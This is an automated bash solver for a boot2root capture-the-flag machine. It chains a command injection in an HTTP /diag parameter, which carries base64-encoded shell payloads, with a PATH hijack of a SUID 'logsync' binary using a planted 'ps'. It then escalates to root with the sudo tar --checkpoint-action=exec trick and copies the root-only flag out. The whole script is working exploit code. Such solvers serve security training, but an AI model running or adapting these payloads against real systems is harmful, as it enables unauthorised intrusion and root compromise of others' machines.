#!/usr/bin/env bash
# Automated end-to-end solver for boot2root-linux.
#
# Drives the whole privesc chain purely through the HTTP command-injection at
# /diag (no interactive shell, no outbound connection needed):
#
#   HTTP injection (www)  ->  SUID logsync PATH hijack (app)
#                         ->  sudo tar --checkpoint-action=exec (root)
#                         ->  copy /root/flag to a www-readable path  ->  read it
#
# Usage: ./solve.sh http://HOST:PORT
set -euo pipefail

BASE="${1:?usage: solve.sh http://HOST:PORT}"
BASE="${BASE%/}"

# --- app-side payload: runs AS app (real uid app) via the hijacked `ps`. -----
# Uses the sudo NOPASSWD tar wildcard + GTFOBins --checkpoint-action=exec to run
# a root command that copies the root-only flag somewhere www can read it.
read -r -d '' APP_PS <<'EOF' || true
#!/bin/sh
cd /home/app 2>/dev/null || cd /tmp
sudo -n /usr/bin/tar -czf /var/backups/app-logs.tgz /etc/hostname \
  --checkpoint=1 \
  --checkpoint-action=exec='cp /root/flag /dev/shm/loot; chmod 644 /dev/shm/loot' \
  >/dev/null 2>&1
EOF

# --- www-side payload: plant the hijack `ps`, trigger logsync, read the loot. -
APP_PS_B64="$(printf '%s' "$APP_PS" | base64 | tr -d '\n')"
read -r -d '' WWW <<EOF || true
rm -f /dev/shm/loot
echo $APP_PS_B64 | base64 -d > /dev/shm/ps
chmod +x /dev/shm/ps
PATH=/dev/shm:\$PATH /usr/local/bin/logsync >/dev/null 2>&1
EOF

WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"

# Inject: "getent hosts x; <www payload via base64|sh>"
INJECT="x; echo ${WWW_B64} | base64 -d | sh"

echo "[*] firing chain through /diag ..." >&2
curl -s -G "$BASE/diag" --data-urlencode "target=${INJECT}" >/dev/null || true

# Give tar's checkpoint action a moment, then read the loot back.
sleep 1
echo "[*] reading /dev/shm/loot ..." >&2
OUT="$(curl -s -G "$BASE/diag" --data-urlencode 'target=x; cat /dev/shm/loot 2>/dev/null')"

FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
if [ -n "$FLAG" ]; then
    echo "[+] flag: $FLAG"
else
    echo "[-] no flag recovered; raw /diag response:" >&2
    printf '%s\n' "$OUT" >&2
    exit 1
fi
